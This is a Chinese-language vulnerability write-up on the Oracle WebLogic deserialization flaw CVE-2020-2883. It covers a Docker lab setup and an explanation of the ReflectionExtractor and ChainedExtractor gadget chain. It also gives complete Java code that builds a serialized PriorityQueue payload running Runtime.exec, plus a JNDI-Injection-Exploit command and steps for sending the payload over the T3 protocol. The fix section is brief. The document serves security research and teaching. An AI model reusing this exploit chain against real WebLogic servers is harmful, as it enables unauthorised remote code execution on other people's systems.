# Weblogic 反序列化RCE漏洞分析(CVE-2020-2883) 

### 靶场搭建

#### 本地搭建

下载地址：
https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html

- weblogic 10.3.6.0
- weblogic 12.1.3.0
- weblogic 12.2.1.4
- weblogic 14.1.1.0.0

#### docker搭建

```yaml
version: '3.7'
services:
 weblogic:
   image: store/oracle/weblogic:12.2.1.4
   volumes:
    - ./properties:/u01/oracle/properties
   environment:
    - DOMAIN_NAME=base_domain
   ports:
    - "7001:7001"
    - "8453:8453"
    - "9002:9002"
```

### 漏洞分析

关于JdbcRowSetImpl、PriorityQueue、ExtractorComparator利用链的分析请看[上一篇文章](https://www.studysec.com/#/papers/java/weblogic/CVE-2020-14841)

概况一下就是已知漏洞利用点和前半截利用链，只需要找到一个不在反序列化黑名单中且内部extract方法存在危险代码的类。

CVE-2020-2883执行链： 
T3协议 -> PriorityQueue -> ExtractorComparator -> ChainedExtractor -> ReflectionExtractor -> RCE

也就是说，该漏洞的关键点依旧是找一个具有符合要求的extract方法的类。

### ReflectionExtractor

```java
//com.tangosol.util.extractor.ReflectionExtractor

public class ReflectionExtractor<T, E> extends AbstractExtractor<T, E> implements ValueExtractor<T, E>, ExternalizableLite, PortableObject {
    @JsonbProperty("method")
    protected String m_sMethod;
    @JsonbProperty("args")
    protected Object[] m_aoParam;
    private transient Method m_methodPrev;

    public ReflectionExtractor(String sMethod, Object[] aoParam, int nTarget) {
        azzert(sMethod != null);
        //getMethodName()返回this.m_sMethod
        this.m_sMethod = sMethod;
        //m_aoParam是下面反射调用类方法时传入的参数
        this.m_aoParam = aoParam;
        this.m_nTarget = nTarget;
    }

    public E extract(T oTarget) {
        if (oTarget == null) {
            return null;
        } else {
            Class clz = oTarget.getClass();

            try {
                //this.m_methodPrev的值被transient修饰，无法控制
                Method method = this.m_methodPrev;
                if (method == null || method.getDeclaringClass() != clz) {
                    //在此处获取传入的对象的所属类的method
                    this.m_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false);
                }
                //通过反射执行类方法
                return method.invoke(oTarget, this.m_aoParam);
            } catch (NullPointerException var4) {
                throw new RuntimeException(this.suggestExtractFailureCause(clz));
            } catch (Exception var5) {
                throw ensureRuntimeException(var5, clz.getName() + this + '(' + oTarget + ')');
            }
        }
    }
}
```

从上面的流程看，最终```return method.invoke(oTarget, this.m_aoParam);```，所有值都可控，理论上是可以满足需要的。

关键点在于this.m_methodPrev无法控制，且直接使用ReflectionExtractor的话，只能获取一次method，非常不灵活。

因此必须找一个能多次调用ReflectionExtractor.extract，且值是我们可控的类

#### ChainedExtractor

让我们来看看这个类在官方手册中怎么描述：
```
Composite ValueExtractor implementation based on an array of extractors. The extractors in the array are applied sequentially left-to-right, so a result of a previous extractor serves as a target object for a next one. 
```

大意是ChainedExtractor将ValueExtractor的值从左到右串联起来，前一个提取器的结果将作为下一个提取器的目标对象。

ChainedExtractor.extract代码：

```java
//com.tangosol.util.extractor.ChainedExtractor

public E extract(Object oTarget) {
    //获取一个ValueExtractor对象数组
    ValueExtractor[] aExtractor = this.getExtractors();
    int i = 0;

    for(int c = aExtractor.length; i < c && oTarget != null; ++i) {
        //遍历ValueExtractor对象数组中存储的对象，调用其extract方法
        oTarget = aExtractor[i].extract(oTarget);
    }

    return oTarget;
}
```

在ChainedExtractor中并没有实现getExtractors()方法，这里调用的是它的父类AbstractCompositeExtractor.getExtractors()

```java
public class ChainedExtractor<T, E> extends AbstractCompositeExtractor<T, E> 
```

getExtractors()返回的是this.m_aExtractor的值，this.m_aExtractor在构造方法中赋值。

```java
public AbstractCompositeExtractor(ValueExtractor[] aExtractor) {
    azzert(aExtractor != null);
    this.m_aExtractor = aExtractor;
}
```

分析完就觉得，ChainedExtractor和ReflectionExtractor本来就是搭配在一起用的，前者用来帮助后者构造反射的调用链。

但是反射调用得先有个类名，需要找一个Class.extract能直接返回类名给ChainedExtractor.extract的oTarget。

这里使用了ConstantExtractor类。

```java
public class ConstantExtractor implements ValueExtractor {
    protected Object m_oConstant;

    public ConstantExtractor(Object oValue) {
        this.m_oConstant = oValue;
    }

    public Object extract(Object oTarget) {
        return this.m_oConstant;
    }
}
```

#### payload

生成的payload.ser通过T3协议发送

```java
public class CVE_2020_2883 {

    public static void main(String[] args) throws Exception {

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
            new ConstantExtractor(Runtime.class),
            new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
            new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
            new ReflectionExtractor("exec", new Object[]{new String[]{"cmd.exe", "/c", "calc"}})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add("foo");
        priorityQueue.add("bar");

        Field comparator = priorityQueue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue, extractorComparator);

        serialize(priorityQueue);
        deserialize();
    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### 漏洞修复

1. 禁用T3、IIOP协议

2. 通过Oracle官网获取并安装最新补丁

### 漏洞利用

```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc"
```

启动ldap服务器

生成序列化payload.ser

通过T3协议发送payload.ser

![avatar](../../../../images/java/weblogic/CVE-2020-2883/2.png)

### PSF案例

![avatar](../../../../images/java/weblogic/CVE-2020-2883/1.png)
